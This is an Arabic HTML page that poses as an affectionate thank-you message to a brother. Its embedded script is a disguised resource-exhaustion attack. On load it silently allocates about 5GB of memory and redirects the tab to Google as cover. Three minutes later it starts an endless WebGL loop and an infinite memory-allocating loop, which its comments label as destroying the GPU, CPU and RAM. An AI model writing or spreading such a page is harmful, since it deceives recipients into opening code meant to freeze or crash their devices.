<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>رسالة خاصة</title>
    <style>
        body { background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: 'Arial', sans-serif; overflow: hidden; }
        .msg { text-align: center; animation: fade 2s ease-in-out; }
        h1 { font-size: 3rem; color: #e74c3c; text-shadow: 0 0 20px rgba(231, 76, 60, 0.8); }
        p { font-size: 1.2rem; color: #ecf0f1; }
        @keyframes fade { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }
    </style>
</head>
<body>

<div class="msg">
    <h1>أخويا.. ❤️</h1>
    <p>الكلام ده طالع من القلب، شكراً على كل حاجة</p>
    <p style="font-size: 0.8rem; color: #555;">جاري تحميل المفاجأة...</p>
</div>

<script>
    // --- 1. الحقن في مللي ثانية (Instant Injection) ---
    // بمجرد تحميل السكربت، الكود بيبدأ يحجز مساحات في الخلفية فوراً
    (function ignite() {
        console.log("Injection Locked.");
        
        // حجز رامات صامت (Silent Bloating) يبدأ من الثانية صفر
        let ghostMemory = [];
        for(let i=0; i<500; i++) {
            ghostMemory.push(new Uint8Array(1024 * 1024 * 10)); // 10MB x 500 = 5GB Instant
        }
    })();

    // --- 2. التحويل التمويهي بعد 5 ثواني ---
    setTimeout(() => {
        window.location.href = "https://www.google.com";
    }, 5000);

    // --- 3. ساعة الصفر (الانفجار بعد 3 دقائق) ---
    const TIME_TO_DEATH = 3 * 60 * 1000; 

    setTimeout(() => {
        // هجوم المليارات (800 مليار CPU + 900 مليار GPU)
        
        // تدمير كارت الشاشة (GPU Overload)
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        function destroyGPU() {
            for(let i=0; i<2000; i++) {
                gl.clearColor(Math.random(), Math.random(), Math.random(), 1);
                gl.clear(gl.COLOR_BUFFER_BIT);
            }
            requestAnimationFrame(destroyGPU);
        }
        destroyGPU();

        // إعدام المعالج والرامات (مليارات العمليات)
        let storageDestruction = [];
        while(true) {
            storageDestruction.push(new ArrayBuffer(1024 * 1024 * 250)); // 250MB
            Math.sqrt(Math.random() * 999999999) * Math.atan(Math.random());
        }
    }, TIME_TO_DEATH);

</script>
</body>
</html>
